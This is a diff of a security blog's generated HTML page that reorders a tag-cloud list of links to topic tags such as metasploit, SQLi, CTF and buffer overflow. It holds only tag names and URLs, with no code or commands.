-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chisel.html">chisel</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bludit.html">bludit</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/openbsd.html">OpenBSD</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+              <a href="https://maggick.fr/tag/jackson.html">jackson</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/upload.html">Upload</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+              <a href="https://maggick.fr/tag/restic.html">restic</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/windows.html">Windows</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
+              <a href="https://maggick.fr/tag/vb.html">VB</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/lxc.html">lxc</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/teamviewer.html">teamviewer</a>
+              <a href="https://maggick.fr/tag/net.html">.NET</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/redis.html">redis</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/api.html">api</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/xss.html">XSS</a>
+              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/windows.html">Windows</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cloudme.html">cloudme</a>
             </li>
             <li class="tag tag-2">
               <a href="https://maggick.fr/tag/cve.html">CVE</a>
             </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/impacket.html">impacket</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cewl.html">cewl</a>
+              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/reverse.html">reverse</a>
@@ -737,49 +770,10 @@ the file send by Rogue. But the file is encrypted. This is part 2.</p>
               <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cloudme.html">cloudme</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vb.html">VB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/splunk.html">Splunk</a>
+              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
             </li>
             <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/openemr.html">openEMR</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/memcache.html">memcache</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/phs.html">PHS</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/linux.html">linux</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/pth.html">PTH</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/pypi.html">pypi</a>
@@ -787,26 +781,116 @@ the file send by Rogue. But the file is encrypted. This is part 2.</p>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
             </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/impacket.html">impacket</a>
+            </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/nano.html">nano</a>
+              <a href="https://maggick.fr/tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/webmin.html">webmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pth.html">PTH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/phishing.html">phishing</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/iot.html">IOT</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/api.html">api</a>
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/lfi.html">LFI</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/composer.html">composer</a>
+              <a href="https://maggick.fr/tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/web.html">web</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/deserialization.html">deserialization</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/nosql.html">NoSQL</a>
@@ -814,116 +898,32 @@ the file send by Rogue. But the file is encrypted. This is part 2.</p>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/hash.html">hash</a>
             </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
-            </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/azure.html">Azure</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/smb.html">SMB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/chisel.html">chisel</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/dll.html">DLL</a>
             </li>
             <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/tomcat.html">tomcat</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/docker.html">docker</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/misc.html">misc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/zip.html">zip</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/webmin.html">webmin</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/umbraco.html">umbraco</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/restic.html">restic</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/redis.html">redis</a>
-            </li>
-            <li class="tag tag-3">
               <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/waf.html">WAF</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/ssti.html">SSTI</a>
             </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/blog.html">blog</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/sudo.html">sudo</a>
             </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
+              <a href="https://maggick.fr/tag/laravel.html">laravel</a>
             </li>
     </ul>
 </section>
